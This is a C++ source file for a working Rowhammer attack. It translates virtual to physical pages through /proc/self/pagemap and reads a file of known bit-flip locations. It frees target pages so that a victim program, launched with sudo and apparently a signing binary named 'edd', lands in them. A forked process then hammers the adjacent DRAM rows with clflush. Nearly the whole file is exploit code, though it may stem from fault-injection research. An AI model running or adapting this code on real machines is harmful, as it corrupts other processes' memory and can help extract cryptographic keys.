#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <sys/sysinfo.h>
#include <utility> 
#include <sys/personality.h>


#include <sched.h>
#include <inttypes.h>
#include <time.h>
#include <signal.h>


#define PAGE_SIZE 4096
#define TOGGLES 2000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define MAX_POSITION 9
#define JUNK1 10


unsigned long long reth1;
unsigned long long retl0;

unsigned long long rdtsc()
{
	__asm__ __volatile__(
		"rdtsc" : // rdpru is more accurate than rdtsc on AMD processors
		"=d"(reth1),
		"=a"(retl0));
	return ((reth1 << 32) | (retl0));
}


using namespace std;
int OFFSET=0;
int STACK_SIZE = 0;
int NUMBER_PAGES=0,NUMBER_TARGET=30;
int TARGET_PAGE[500];
size_t mem_size;
char *memory;
char *smapping;
double fraction_of_physical_memory = 0.5;

int *hammer;
uintptr_t attackPages[20086], abovePages[20086], belowPages[20086],offset[20086];

enum Pattern { zero_zero_zero, zero_zero_one, one_zero_zero, one_zero_one };

struct PageCandidate {
    uint64_t pageNumber;
    uint64_t abovePage;
    uint64_t belowPage;

    uint8_t* pageVA;
    uint8_t* aboveVA[2];
    uint8_t* belowVA[2];
    uint8_t offset;
};
int wait=0;
// fault handler functions
void sigterm(int sig, siginfo_t *siginfo, void *context)
{

//	printf("Caught segfault at address %p\n", siginfo->si_addr);
	//ucontext_t *ucontext = (ucontext_t *)context;
	//ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
        wait--;
	return;
}

// binding fault handler
int set_signal(void)
{
	struct sigaction act;
	act.sa_sigaction = sigterm;
	act.sa_flags = SA_SIGINFO;
	return sigaction(SIGTERM, &act, NULL);
}

uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}




bool pagesFilled(PageCandidate p) {
    if(p.pageVA != 0 && p.aboveVA[0] != 0 && p.belowVA[0] != 0) {
        return true;
    } else {
        return false;
    }
}

/*
void *GetBlockByOrder(int order){
    size_t s=PAGE_SIZE*pow(2, order);
    mem_size = s;
    void *ptr = memory;

    for (uint64_t index = 0; index < s; index += 0x1000) {
        uint64_t* temporary = reinterpret_cast<uint64_t*>(static_cast<uint8_t*>(ptr) + index);
        temporary[0] = index+1;
    }
    return ptr;
}
*/
void *GetBlockByOrder(int order){

	size_t s=200*4096;
        mem_size = s;
        
    void *ptr = memory;
    assert(ptr!= (void*)-1);

    for (uint64_t index = 0; index < s; index += 0x1000) {
        uint64_t* temporary = reinterpret_cast<uint64_t*>(static_cast<uint8_t*>(ptr) + index);
        temporary[0] = index+1;
    }
    return ptr;
}


uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));

    printf("MemorySize: %ld\n", mem_size);  


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    hammer = (int *) mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    assert(memory != MAP_FAILED);

    for(size_t i = 0; i < mem_size; i++) {
	    memory[i] = 77 + i;
	    //printf("%lx\n",getPage((uint8_t*)&memory[i]));
    }
}

void fillMemory(uint8_t* victimVA, uint8_t* aboveVA, uint8_t* belowVA) {
    memset((void *) victimVA, 0x00, PAGE_SIZE);

    uint8_t lowerBits = 0x00;
    uint8_t upperBits = 0x01;
    for(int i = 0; i < PAGE_SIZE; i++) {
        if(i % 2 == 0) {
            memset((void *) (aboveVA + i), lowerBits, 1);
            memset((void *) (belowVA + i), lowerBits, 1);
        } else {
            memset((void *) (aboveVA + i), upperBits, 1);
            memset((void *) (belowVA + i), upperBits, 1);
        }
    }
}




void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations, int togs) {
    for(int i = 0; i < iterations; i++) {
        volatile uint64_t *f = (volatile uint64_t *)aboveVA;
        volatile uint64_t *s = (volatile uint64_t *)belowVA;
        unsigned long iters = togs;

        for(; iters --> 0;) {
            asm volatile("clflush (%0)" : : "r" (f) : "memory");
            *f;
            asm volatile("clflush (%0)" : : "r" (s) : "memory");
            *s;
        }
    }
}





void addVAstoPages(vector<PageCandidate> &pages) {
    printf("Searching for page VAs...\n");
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
	    int temp=0;
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }

            if(p.abovePage == moverPA) {
                p.aboveVA[0] = moverVA;
	        	match = true;
            }
            if(p.belowPage == moverPA) {
                p.belowVA[0] = moverVA;
	        	match = true;
            }
            pages[i] = p;
        }



            moverVA += 0x1000;
    }
    printf("Done searching...\n\n");
}



void rowhammerAttack(vector<PageCandidate> &pages) {
    int i,j=0;
    int r=OFFSET;
    for(int i = 0; i < NUMBER_PAGES; i++) {
    if(pages[i].aboveVA[0]!=NULL && pages[i].belowVA[0]!=NULL && pages[i].pageVA !=NULL)
    {
    	TARGET_PAGE[j]=i;
    	//printf("Target: %d\n", TARGET_PAGE[j]);
   //     printf("Target PFN: %p\n", pages[TARGET_PAGE[j]].pageNumber);
  // 	printf("bit flip:%ld\n", offset[TARGET_PAGE[j]]);
    //    printf("i:%d,j%d\n",i,j);
    	j++;
    	if(j==NUMBER_TARGET){
    	break;
    	}
    }

    }
       


    for(int i = 0; i < NUMBER_TARGET; i++) {
        PageCandidate p = pages[TARGET_PAGE[i]];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
        }
    }
    

    printf("All pages found...\n");

  //  printf("Pages size: %d\n", pages.size());

  //  printf("Holding same DRAM pages\n");
    
	
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    PageCandidate p = pages[TARGET_PAGE[i]];
	    fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
	  //  fillMemory(p.pageVA, p.aboveVA[1], p.belowVA[1]);
	   // printf("pageNUmber:%d\n",p.pageNumber);
           // formOuterPages(p);
    }


	 //    p = pages[TARGET_PAGE];
	  //  fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
	

    uint8_t *mapping = (uint8_t *)(GetBlockByOrder(12));

    vector<pair<int, uint64_t>> indices;
    int count = 0;
    while(indices.size() < JUNK1+ STACK_SIZE) {
    	//printf("count: %d, indices.size=%d\n", count,indices.size());
        pair<int, uint64_t> p;
        uint64_t addrs = getPage((uint8_t*)mapping+PAGE_SIZE*count);
        //printf("addrs: %lx\n",addrs);
        if(addrs >= 0x100000) { 
            p = make_pair(count, addrs);
            indices.push_back(p);
        }
        count++;

    }
  
FILE* fp4=fopen("page.txt","w");

    for(int i = 0; i < JUNK1; i++) {
	    fprintf(fp4,"Bottom Iteration %i: %lx\n", i, indices[i].second);
    }
    
    
    
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    fprintf(fp4,"Victim Iteration %i: %x\n", i, pages[TARGET_PAGE[i]].pageNumber);
    }
    
    // fprintf(fp4,"Victim Iteration: %x\n", pages[TARGET_PAGE].pageNumber);
    
    
    
    for(int i = JUNK1; i < JUNK1+STACK_SIZE; ++i) {
	    fprintf(fp4,"Top Iteration %i: %lx\n", i, indices[i].second);
    }
	fflush(fp4);


    printf("Starting hammering...\n");
    
   fflush(stdout);


    int pid = fork();
    if(pid == 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(1, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");
    for(int i = 0; i < NUMBER_TARGET; i++) {
	    memset((void *) pages[TARGET_PAGE[i]].pageVA, NUMBER_PAGES+TARGET_PAGE[i]&0xFF, PAGE_SIZE);
    }

        for(int i = 0; i < JUNK1; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
            
    
            
        
        for(int i = JUNK1; i < JUNK1+STACK_SIZE; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
       // usleep(100);
 wait=1;
   uint64_t victim;
 while(wait);
   char line0[100];
   FILE * fp5=fopen("victim.txt","r");
 if(fgets(line0,sizeof(line0),fp5)!=NULL) {
	line0[strcspn(line0,"\n")]='\0';
	victim=stol(&line0[2],0,16);
 }
 printf("Im going to hammer %p\n",victim);
unsigned long long tsc1,tsc2;
        while(1) {
                int togs = TOGGLES;
		tsc1=rdtsc();
                for(int pNum = 0; pNum < NUMBER_TARGET; pNum++) {
           //     printf("hammer %lx!\n",pages[TARGET_PAGE[pNum]].pageNumber );
	        if(pages[TARGET_PAGE[pNum]].pageNumber==victim){
                rowhammer(pages[TARGET_PAGE[pNum]].aboveVA[0], pages[TARGET_PAGE[pNum]].belowVA[0], 1, togs);
                tsc2=rdtsc();
        printf("hammer: %d!\n",tsc2-tsc1);
		fflush(stdout);
		break;
		}
		}
		break;
        }
	sleep(2);
//	system("sudo pkill -9 edd");
	exit(0);
        
    } else {

        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(3, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");
	size_t s=200*4096;
        mem_size = s;
	smapping=(char *) mmap(NULL, s, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
//	while(!*(hammer));
        for(int i = 0; i < JUNK1; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }
        
        
        /*
        for(int i = 0; i < NUMBER_PAGES; i++) {
            munmap((void *) pages[i].pageVA, PAGE_SIZE);
        }*/
            for(int i = 0; i < NUMBER_TARGET; i++) {
	    munmap((void *) pages[TARGET_PAGE[i]].pageVA, PAGE_SIZE);
    }
        
         
        
        for(int i = JUNK1; i < JUNK1+STACK_SIZE; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }
        

        printf("finish munmaping\n");
	fflush(stdout);
	//usleep(1000);
        
	int ok = system("sudo taskset -c 3 ./wolf/edd");
//	int ok = system("sudo taskset -c 7 ./test/main");
        //int ok = system("sudo taskset 0x2 ./check");
       
	exit(0);
        printf("System call status: %i\n", ok);

       // sleep(2);


      //  system("sudo pkill -2 attack");
    }



	printf("Done hammering\n");
}


vector<PageCandidate> pages;

int main(int argc, char *argv[]) {
    printf("Starting program...\n");
        set_signal();
    int opt;
    while ((opt = getopt(argc, argv, "to:s:")) != -1) {
        switch(opt) {
            case 'o':
                STACK_SIZE = (int) strtol(optarg, NULL, 10);
		        break;
	    case 's':
                OFFSET = (int) strtol(optarg, NULL, 10);
                        break;

            case 't':
                
                printf("Starting test mode...\n\n");
                break;
        }
    }
 cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(2, &set);
        printf("%d\n",OFFSET);
        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");
            
    printf("Stack size is %i\n", STACK_SIZE);
    FILE *fp=fopen("bitflip_addrs","r");
    if(fp==NULL){
    printf("can not load file!\n");
    }
    char line[10000],temp;
    int bit;
    long tt;
    while(fgets(line,sizeof(line),fp)!=NULL)
    {
    	line[strcspn(line,"\n")]='\0';
    	char* token;
    	token=strtok(line, ",");
    	if(token!=NULL){
    	abovePages[NUMBER_PAGES]=stol(token,0,16);
    	abovePages[NUMBER_PAGES]=abovePages[NUMBER_PAGES]/0x1000;
    	token=strtok(NULL,",");
    	}
    	if(token!=NULL){
    	belowPages[NUMBER_PAGES]=stol(token,0,16);
    	belowPages[NUMBER_PAGES]=belowPages[NUMBER_PAGES]/0x1000;
    	token=strtok(NULL,",");
    	}
    	if(token!=NULL){
    	attackPages[NUMBER_PAGES]=stol(token,0,16);
    	tt=attackPages[NUMBER_PAGES];

    	offset[NUMBER_PAGES]=8*(attackPages[NUMBER_PAGES]%(0x1000));
    	attackPages[NUMBER_PAGES]=attackPages[NUMBER_PAGES]/(0x1000);
    	
    	token=strtok(NULL,",");
    	}
    	
    	if(token!=NULL){
    	offset[NUMBER_PAGES]+=atoi(token);
    	token=strtok(NULL,",");
    	}
    	
    	if(token!=NULL){
    	
    	
    //	if(offset[NUMBER_PAGES]>=8*0x100 && offset[NUMBER_PAGES] <(8*0x120) && offset[NUMBER_PAGES]-0x100*8-OFFSET<128 && offset[NUMBER_PAGES]-0x100*8-OFFSET>=0){
//   	if(offset[NUMBER_PAGES]>=(8*0x0e0) && offset[NUMBER_PAGES] <(8*0x100)){
    	
   	NUMBER_PAGES++;
    	//printf("%lx\n",tt);
    	
    	
    	
    //	}
    
    	/*
    	if(offset[NUMBER_PAGES]>=8*0x20 && offset[NUMBER_PAGES] <8*0x58){
    	
    	if(atoi(token)==0){
    	temp= sk2[offset[NUMBER_PAGES]/8-16] & (~(1 << (offset[NUMBER_PAGES]%8)));
    	}
    	
    	else{
    	temp= sk2[offset[NUMBER_PAGES]/8-16] | (1 << (offset[NUMBER_PAGES]%8));
    	}
    	
    	
    	
    	
    	if(temp!=sk2[offset[NUMBER_PAGES]/8-16]){
    	
    	NUMBER_PAGES++;
    	//printf("%lx\n",tt);
    	
    	}
    	
    	}
    	*/
    	}
    }
    printf("get %d pages!\n",NUMBER_PAGES);

    string fileText;
    string subString;
    string dataString;
    string needle;
    int pageCount = 0;
    uintptr_t pageValue;


    //uintptr_t attackPages[NUMBER_PAGES] = { 0x191b2c, 0x191b2b};
    //uintptr_t abovePages[NUMBER_PAGES] = { 0x191b0a, 0x191b0e};
    //uintptr_t belowPages[NUMBER_PAGES] = { 0x191b43, 0x191b47};

    setupMapping();
    printf("Finished setting up memory...\n");
    int i;
    for(int k =0; k < NUMBER_PAGES; k++) {
	i=(k+OFFSET)%NUMBER_PAGES;
        PageCandidate p;
        p.pageNumber = attackPages[i];
        p.abovePage = abovePages[i];
        p.belowPage = belowPages[i];

        p.pageVA = 0;
        p.aboveVA[0] = 0;
        p.belowVA[0] = 0;
        pages.push_back(p);
	if(pages.size()>2000){
		break;
	}
    }

    addVAstoPages(pages);

    rowhammerAttack(pages);

    return 0;
}
